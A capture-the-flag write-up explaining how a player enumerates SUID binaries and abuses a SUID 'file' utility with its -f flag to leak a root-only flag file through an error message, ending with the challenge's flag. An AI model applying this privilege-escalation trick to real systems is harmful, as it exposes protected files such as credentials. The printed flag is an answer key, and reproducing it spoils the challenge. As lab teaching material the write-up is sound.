# Secure Unusual Iconical Dock writeup
Having got into the server, we see the **flag.txt** in home directory:

```bash
$ ls
flag.txt
```

But when we try to read it, we get:

```bash
$ cat flag.txt
cat: flag.txt: Permission denied
```

It means we don't have permissions to read the flag. Let's make sure:

```bash
$ ls -lah
total 12K
drwxr-xr-x 1 root root 4.0K Oct 10 18:05 .
drwxr-xr-x 1 root root 4.0K Oct 10 18:10 ..
-r-------- 1 root root   53 Oct 10 18:04 flag.txt
```

Accoring to **ls**, nobody except **root** can't read the flag. So, we have to escalate our privileges somehow. Googlin' the abbreviation (**S**ecure **U**nusual **I**conical **D**ock) leads us to the **SUID**. SUID - is an executable file permission, which makes gives its owner's permissions to everyone who run it. Here is the way to find these helpful binaries:

```bash
$ find / -type f -perm -4000 2>>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/file
```

Among other default SUID binaries we see quite unusual one - **file**. This utility provides an information about files. It possesses one helpful flag - "-f". It reads a list of files from provided file and analyses them all. And as we know if we try to read the file that doesn't exist, the program will throw an exception like this: `"cool.txt": No such file or directory`. Let's use this useful feature:

```bash
$ file -f flag.txt
li2CTF{1nN3r_p34C3_4Lw4y5_l34D5_70__5ucc355}: cannot open `li2CTF{1nN3r_p34C3_4Lw4y5_l34D5_70__5ucc355}' (No such file or directory)
```

P.S. `2>>/dev/null` is a simple trick that allows to hide errors (we need it because **find** prints all the 'Permission Denied's it faces, so our console would be spammed). In other words, it redirects `stderr` to the special device - **/dev/null**

Flag: `li2CTF{1nN3r_p34C3_4Lw4y5_l34D5_70__5ucc355}`
